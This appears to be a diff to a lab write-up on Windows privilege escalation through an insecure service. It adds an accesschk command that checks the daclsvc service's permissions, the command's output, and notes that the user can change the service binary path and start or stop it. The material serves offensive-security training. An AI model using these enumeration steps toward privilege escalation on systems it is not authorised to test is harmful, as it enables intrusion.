@@ -278,3 +278,27 @@ meterpreter > upload /home/kali/Desktop/tools/accesschk.exe
 <p align="center">
   <img src="/writeups/Windows-Privilege-Escalation/insecure service configuration/images/step8-1.png" width="600">
 </p>
+
+Checked Service Permissions
+
+```bash
+C:\PrivEsc> .\accesschk.exe /accepteula -uwcqv user daclsvc
+```
+### Output
+
+```
+RW daclsvc
+        SERVICE_QUERY_STATUS
+        SERVICE_QUERY_CONFIG
+        SERVICE_CHANGE_CONFIG
+        SERVICE_INTERROGATE
+        SERVICE_ENUMERATE_DEPENDENTS
+        SERVICE_START
+        SERVICE_STOP
+        READ_CONTROL
+```
+
+- `RW daclsvcI` : have read and write access to this service
+- `SERVICE_CHANGE_CONFIGI` : can change the service binary path
+- `SERVICE_START` : I can start the service
+- `SERVICE_STOP` : I can stop the service
